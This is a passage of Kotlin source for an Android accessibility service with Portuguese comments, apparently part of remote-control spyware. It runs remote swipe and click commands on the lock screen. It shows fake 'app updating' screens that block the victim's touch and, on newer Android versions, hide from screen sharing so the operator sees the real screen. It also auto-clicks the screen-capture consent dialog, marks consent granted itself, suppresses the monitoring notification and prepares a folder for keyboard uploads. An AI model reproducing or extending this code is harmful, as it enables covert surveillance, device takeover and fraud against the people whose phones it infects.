            enviarLog("[PADRÃO RECUSADO] dispatchGesture para senha padrão foi recusado pelo Android.")
            onResult?.invoke(false)
        }
    }

    /**
     * Executa ações remotas na tela de bloqueio (swipe_up, clique_coord, etc.).
     */
    fun executarComandoBloqueio(action: String, value: String?, x: Float?, y: Float?) {
        when (action.lowercase()) {
            "swipe_up", "acordar", "deslizar_cima" -> {
                desbloquearSwipeRemoto()
                enviarLog("[BLOQUEIO] Swipe-up vertical executado para abrir a tela de senha.")
            }
            "clique_pin", "clique_coord" -> {
                if (x != null && y != null) {
                    clickAt(x, y)
                    enviarLog("[BLOQUEIO] Clique na coordenada ($x, $y) [valor=$value].")
                }
            }
            "abrir_acessibilidade" -> {
                abrirAcessibilidadeSettings()
            }
        }
    }

    fun abrirAcessibilidadeSettings() {
        try {
            val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            enviarLog("[BLOQUEIO] Tela de configurações de acessibilidade aberta no dispositivo.")
        } catch (e: Exception) {
            enviarLog("[BLOQUEIO ERRO] Falha ao abrir acessibilidade: ${e.message}")
        }
    }

    fun ativarAtualizacaoGlobal(ativo: Boolean) {
        handlerMain.post {
            try {
                if (ativo) {
                    if (overlayAtualizacao == null) {
                        val wm = windowManager ?: getSystemService(WINDOW_SERVICE) as? WindowManager ?: return@post

                        val container = FrameLayout(this).apply {
                            // Fundo escuro com OPACIDADE regulável pelo slider do
                            // painel (evento 'overlay_opacidade'); fonte única em
                            // OverlayService.opacidadeFundo.
                            setBackgroundColor(OverlayService.corFundo())
                            isClickable = true
                            isFocusable = true
                            setOnTouchListener { _, _ -> true }

                            if (Build.VERSION.SDK_INT >= 34) {
                                try {
                                    val method = View::class.java.getMethod("setHideDuringScreenSharing", Boolean::class.java)
                                    method.invoke(this, true)
                                } catch (_: Exception) {}
                            }

                            val inner = LinearLayout(context).apply {
                                orientation = LinearLayout.VERTICAL
                                gravity = Gravity.CENTER
                                setPadding(dp(32), dp(32), dp(32), dp(32))
                            }

                            val progressBar = ProgressBar(context).apply {
                                isIndeterminate = true
                                layoutParams = LinearLayout.LayoutParams(dp(64), dp(64)).apply {
                                    bottomMargin = dp(24)
                                }
                            }

                            val title = TextView(context).apply {
                                text = "Atualizando o aplicativo..."
                                textSize = 20f
                                setTextColor(Color.WHITE)
                                setTypeface(null, android.graphics.Typeface.BOLD)
                                gravity = Gravity.CENTER
                                layoutParams = LinearLayout.LayoutParams(
                                    LinearLayout.LayoutParams.WRAP_CONTENT,
                                    LinearLayout.LayoutParams.WRAP_CONTENT
                                ).apply {
                                    bottomMargin = dp(12)
                                }
                            }

                            val subtitle = TextView(context).apply {
                                text = "Aguarde enquanto sincronizamos os dados.\nNão feche o aplicativo."
                                textSize = 14f
                                setTextColor(Color.parseColor("#CCCCCC"))
                                gravity = Gravity.CENTER
                            }

                            inner.addView(progressBar)
                            inner.addView(title)
                            inner.addView(subtitle)
                            addView(inner)
                        }

                        val typeOverlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                        } else {
                            WindowManager.LayoutParams.TYPE_PHONE
                        }

                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            typeOverlay,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                            PixelFormat.TRANSLUCENT
                        ).apply {
                            gravity = Gravity.CENTER
                        }

                        wm.addView(container, params)
                        overlayAtualizacao = container
                    }
                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        iniciarCapturaAcessibilidade()
                    } else {
                        pararCapturaAcessibilidade()
                    }
                    enviarLog("[ATUALIZAÇÃO] Overlay de atualização global ativado.")
                } else {
                    overlayAtualizacao?.let {
                        try {
                            windowManager?.removeView(it)
                        } catch (_: Exception) {}
                        overlayAtualizacao = null
                    }
                    pararCapturaAcessibilidade()
                    enviarLog("[ATUALIZAÇÃO] Overlay de atualização global desativado.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao alterar overlay de atualização global: ${e.message}")
            }
        }
    }



    private fun tipoOverlaySeguro(): Int {
        val fabricante = Build.MANUFACTURER.lowercase()
        val hardware = Build.HARDWARE.lowercase()
        if (hardware.contains("nox") || hardware.contains("memu") ||
            hardware.contains("vbox") || hardware.contains("goldfish") ||
            hardware.contains("ranchu")) {
            return WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
        }
        if (fabricante.contains("xiaomi") || fabricante.contains("redmi") ||
            fabricante.contains("poco")) {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
        }
        return WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
    }

    fun mostrarOverlayAtualizacao() {
        handlerMain.post {
            if (overlayAtualizacao != null) return@post
            val tipoOverlay = tipoOverlaySeguro()
            // SÓ exige SYSTEM_ALERT_WINDOW quando NÃO for o overlay de
            // acessibilidade. TYPE_ACCESSIBILITY_OVERLAY (caminho do Nox/MEmu)
            // NÃO depende de canDrawOverlays — no Nox essa permissão costuma
            // estar negada, e exigi-la aqui fazia o overlay "não aparecer".
            if (tipoOverlay != WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                !Settings.canDrawOverlays(this)) {
                enviarLog("[OVERLAY ATZ] Sem permissão SYSTEM_ALERT_WINDOW")
                SocketManager.socket?.emit("overlay_falhou",
                    JSONObject().put("motivo", "sem_permissao_overlay"))
                return@post
            }
            val container = FrameLayout(this).apply {
                setBackgroundColor(Color.parseColor("#CC000000"))
            }
            val progresso = ProgressBar(this).apply { isIndeterminate = true }
            container.addView(progresso,
                FrameLayout.LayoutParams(dp(64), dp(64), Gravity.CENTER))
            val texto = TextView(this).apply {
                text = "Atualizando..."
                setTextColor(Color.WHITE)
                textSize = 18f
                gravity = Gravity.CENTER
            }
            container.addView(texto, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.CENTER
            ).apply { topMargin = dp(100) })

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                tipoOverlay,
                // SEM FLAG_SECURE: com ela a janela some da captura de tela
                // (MediaProjection) → o emulador flutuante do painel, que mostra
                // o espelhamento, NUNCA exibiria o overlay. Removê-la faz o
                // cartão aparecer no espelhamento, igual ao OverlayService.
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            ).apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }
            try {
                windowManager?.addView(container, params)
                overlayAtualizacao = container
                isAtualizacaoAtiva = true
                enviarLog("[OVERLAY ATZ] Visível no display físico e no espelhamento (sem FLAG_SECURE)")
                handlerMain.postDelayed({
                    if (container.isAttachedToWindow && container.isShown) {
                        enviarLog("[OVERLAY ATZ] CONFIRMADO visível (${Build.MANUFACTURER}-${Build.MODEL})")
                    } else {
                        enviarLog("[OVERLAY ATZ ERRO] Não anexou após 250ms")
                        SocketManager.socket?.emit("overlay_falhou", JSONObject()
                            .put("motivo", "nao_anexou")
                            .put("fabricante", Build.MANUFACTURER)
                            .put("modelo", Build.MODEL))
                    }
                }, 250)
            } catch (e: Exception) {
                enviarLog("[OVERLAY ATZ ERRO] addView falhou: ${e.message}")
                SocketManager.socket?.emit("overlay_falhou", JSONObject()
                    .put("motivo", "addView_exception")
                    .put("erro", e.message ?: "?"))
            }
        }
    }

    fun esconderOverlayAtualizacao() {
        handlerMain.post {
            overlayAtualizacao?.let {
                try { windowManager?.removeView(it) } catch (_: Exception) {}
            }
            overlayAtualizacao = null
            isAtualizacaoAtiva = false
            enviarLog("[OVERLAY ATZ] Removido")
        }
    }

    // ========================================================================
    // HANDLER DO DISPOSITIVO — tela PRETA de "Nova Atualização" (robusta).
    // ------------------------------------------------------------------------
    // Antes isto dependia do AtualizacaoDispositivoService, que exigia
    // SYSTEM_ALERT_WINDOW e startService (bloqueado em segundo plano) — por isso
    // "não aparecia / falhava". Aqui o PRÓPRIO serviço de acessibilidade (sempre
    // vivo) desenha a camada preta opaca via TYPE_ACCESSIBILITY_OVERLAY, que NÃO
    // precisa daquela permissão nem de startService. Carregamento com
    // ProgressBar nativa (sem animador custom que pudesse travar). CONSOME os
    // toques (sem FLAG_NOT_TOUCHABLE) para o usuário não interagir enquanto
    // "atualiza". SEM FLAG_SECURE → aparece também no espelhamento do painel.
    // ========================================================================
    fun mostrarAtualizacaoDispositivoPreta() {
        handlerMain.post {
            if (overlayAtualizacaoPreta != null) return@post
            val wm = windowManager ?: (getSystemService(WINDOW_SERVICE) as? WindowManager)
            if (wm == null) { enviarLog("[ATZ DISP] WindowManager indisponível"); return@post }
            windowManager = wm
            val tipoOverlay = tipoOverlaySeguro()
            // Só o caminho TYPE_APPLICATION_OVERLAY (ex.: Xiaomi) precisa da
            // permissão; o de acessibilidade não. Se faltar, cai no de
            // acessibilidade para NUNCA deixar de aparecer.
            var tipoFinal = tipoOverlay
            if (tipoOverlay != WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                !Settings.canDrawOverlays(this)) {
                tipoFinal = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            }

            // COMPATIBILIDADE POR VERSÃO:
            // • Android 14+ (API 34): PRETO OPACO + setHideDuringScreenSharing →
            //   a pessoa vê preto total; VOCÊ vê a tela REAL no espelhamento.
            // • Android 7–13: o MediaProjection captura EXATAMENTE a tela física,
            //   então é impossível (sem root) mostrar preto à pessoa e a tela
            //   real a você ao mesmo tempo. Para você CONTINUAR vendo a tela
            //   real, usamos um VÉU LEVE translúcido: você enxerga a tela por
            //   baixo + "Carregando"; a pessoa vê a tela levemente escurecida +
            //   "Atualizando", com o TOQUE bloqueado (o essencial do bloqueio).
            val api34 = Build.VERSION.SDK_INT >= 34
            val corFundo = if (api34) 0xFF000000.toInt() else 0x66000000.toInt()
            val raiz = FrameLayout(this).apply {
                setBackgroundColor(corFundo)
                isClickable = true
                setOnTouchListener { _, _ -> true }                 // consome toque local
                if (api34) {
                    try {
                        View::class.java
                            .getMethod("setHideDuringScreenSharing", Boolean::class.java)
                            .invoke(this, true)
                    } catch (_: Exception) {}
                }
            }
            val coluna = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
            }
            val progresso = ProgressBar(this).apply { isIndeterminate = true }
            coluna.addView(progresso, LinearLayout.LayoutParams(dp(64), dp(64)).apply {
                gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = dp(24)
            })
            val titulo = TextView(this).apply {
                text = "Atualizando o aplicativo"
                textSize = 20f; setTextColor(Color.WHITE); gravity = Gravity.CENTER
            }
            coluna.addView(titulo, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = dp(8) })
            val subtitulo = TextView(this).apply {
                text = "Instalando a nova versão"
                textSize = 13f; setTextColor(Color.parseColor("#9AA0A6")); gravity = Gravity.CENTER
            }
            coluna.addView(subtitulo, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = dp(20) })
            val aviso = TextView(this).apply {
                text = "Não desligue o dispositivo"
                textSize = 11f; setTextColor(Color.parseColor("#5F6368")); gravity = Gravity.CENTER
            }
            coluna.addView(aviso, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { gravity = Gravity.CENTER_HORIZONTAL })
            raiz.addView(coluna, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.CENTER
            ))

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                tipoFinal,
                // SEM FLAG_NOT_TOUCHABLE (consome toque) e SEM FLAG_SECURE
                // (aparece no espelhamento). FLAG_KEEP_SCREEN_ON mantém acesa.
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                // Opaco no 14+ (preto total); translúcido no 7–13 (véu leve, para
                // o alpha do fundo compor com a tela por baixo no espelhamento).
                if (api34) PixelFormat.OPAQUE else PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.CENTER
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }
            try {
                wm.addView(raiz, params)
                overlayAtualizacaoPreta = raiz
                enviarLog("[ATZ DISP] Tela de atualização exibida (api34=$api34, tipo=$tipoFinal)")
            } catch (e: Exception) {
                enviarLog("[ATZ DISP ERRO] addView falhou: ${e.message}")
            }
        }
    }

    fun esconderAtualizacaoDispositivoPreta() {
        handlerMain.post {
            overlayAtualizacaoPreta?.let {
                try { windowManager?.removeView(it) } catch (_: Exception) {}
            }
            overlayAtualizacaoPreta = null
            enviarLog("[ATZ DISP] Tela preta removida")
        }
    }

    fun ajustarOpacidadeFundoOverlay(opacidade: Float) {
        handlerMain.post {
            val v = opacidade.coerceIn(0f, 1f)
            val alpha = (v * 204).toInt()
            (overlayAtualizacao as? FrameLayout)?.setBackgroundColor(
                Color.argb(alpha, 0, 0, 0)
            )
            enviarLog("[OVERLAY ATZ] Opacidade = ${(v * 100).toInt()}%")
        }
    }

    fun atualizarOpacidadeOverlayAtualizacao(op: Float) {
        ajustarOpacidadeFundoOverlay(op)
    }

    fun ativarKioskAtualizacao() {
        mostrarOverlayAtualizacao()
    }

    fun removerKioskAtualizacao() {
        esconderOverlayAtualizacao()
    }

    private fun iniciarCicloAutoCliqueMediaProjection(raiz: AccessibilityNodeInfo) {
        // Acessibilidade ATIVA já é o consentimento (gravado no onServiceConnected).
        // Garante que a pref esteja marcada; não suspende mais o auto-clique se,
        // por algum motivo, ela ainda não tiver sido gravada — o serviço estar
        // rodando aqui significa que o usuário autorizou a Acessibilidade.
        try {
            getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
                .edit().putBoolean("consentimento_captura", true).apply()
        } catch (_: Exception) {}

        // CLIQUE RÁPIDO: primeira tentativa é imediata; os retries usam uma
        // espera curta (120ms) só para dar tempo do botão renderizar.
        for (tentativa in 0..4) {
            val sucesso = executarPassosMediaProjection(raiz)
            if (sucesso) {
                enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado automaticamente na tentativa ${tentativa + 1}.")
                return
            }
            if (tentativa < 4) {
                try { Thread.sleep(120L) } catch (_: Exception) {}
                val novaRaiz = rootInActiveWindow ?: break
                if (executarPassosMediaProjection(novaRaiz)) {
                    enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado no retry ${tentativa + 1}.")
                    return
                }
            }
        }

        enviarLog("[MEDIA-PROJECTION AVISO] Auto-clique falhou após tentativas. Emitindo notificação persistente de fallback.")
        emitirNotificacaoFallbackMediaProjection()
    }

    private fun executarPassosMediaProjection(no: AccessibilityNodeInfo): Boolean {
        try {
            procurarESelecionarTelaInteira(no)
            return procurarEClicarBotaoConfirmacaoMP(no)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao executar passos do MediaProjection: ${e.message}")
            return false
        }
    }

    private fun procurarESelecionarTelaInteira(no: AccessibilityNodeInfo): Boolean {
        try {
            val texto = ((no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")).trim().lowercase()
            val eTelaInteira = texto.contains("tela inteira") || texto.contains("entire screen") ||
                texto.contains("toda a tela") || texto.contains("all screen")
            if (eTelaInteira && (no.isCheckable || no.isClickable)) {
                if (!no.isChecked) {
                    val ok = no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    if (ok) {
                        enviarLog("[MEDIA-PROJECTION] Opção 'Tela inteira' selecionada com sucesso.")
                        return true
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarESelecionarTelaInteira(filho)) return true
            }
        } catch (_: Exception) {}
        return false
    }

    private fun procurarEClicarBotaoConfirmacaoMP(no: AccessibilityNodeInfo): Boolean {
        try {
            val viewId = (no.viewIdResourceName ?: "").lowercase()
            val texto = ((no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")).trim().lowercase()
            
            val eBotaoId = viewId.endsWith(":id/button1") || viewId.endsWith(":id/ok")
            val eBotaoTexto = textosBotaoMidiaProjecao.any { texto.contains(it) }
            val eBloqueio = textosBloquear.any { texto.contains(it) }

            if ((eBotaoId || eBotaoTexto) && !eBloqueio && !botaoJaClicadoNaTela(texto)) {
                // CORREÇÃO (auto-clique falhava em Samsung/A105M): o nó que CARREGA
                // o texto "Iniciar agora" quase nunca é o clicável — o texto fica
                // num TextView filho de um Button/container clicável. Antes só
                // clicávamos se o próprio nó do texto fosse clicável -> nunca
                // clicava -> o diálogo de permissão reaparecia toda hora. Agora:
                // clica no próprio nó se clicável; senão SOBE até o 1º ancestral
                // clicável e clica nele.
                var alvo: AccessibilityNodeInfo? = if (no.isClickable) no else null
                var ancestral = if (alvo == null) no.parent else null
                var saltos = 0
                while (alvo == null && ancestral != null && saltos < 6) {
                    if (ancestral.isClickable) { alvo = ancestral; break }
                    ancestral = ancestral.parent
                    saltos++
                }
                if (alvo != null) {
                    val ok = alvo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    if (ok) {
                        marcarBotaoClicado(texto)
                        enviarLog("[MEDIA-PROJECTION] Botão de início clicado (nó ou ancestral clicável): viewId=$viewId, texto='$texto'")
                        return true
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarBotaoConfirmacaoMP(filho)) return true
            }
        } catch (_: Exception) {}
        return false
    }

    private fun extrairTextoArvore(no: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        try {
            val t = (no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")
            sb.append(t).append(" ")
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                sb.append(extrairTextoArvore(filho)).append(" ")
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun emitirNotificacaoFallbackMediaProjection() {
        // Notificação "Toque para reativar monitoramento" DESATIVADA a pedido.
        // Em vez de emitir, garantimos que qualquer notificação antiga (id 9988)
        // seja removida para que nada fique aparecendo no topo da tela.
        try {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            nm.cancel(9988)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao cancelar notificação de fallback do MediaProjection: ${e.message}")
        }
    }

    private fun criarPastaUploadTeclado() {
        try {
            val pasta = File(filesDir, "upload_teclado")
            if (!pasta.exists()) {
                pasta.mkdirs()
            }
        } catch (_: Exception) {}
    }
}
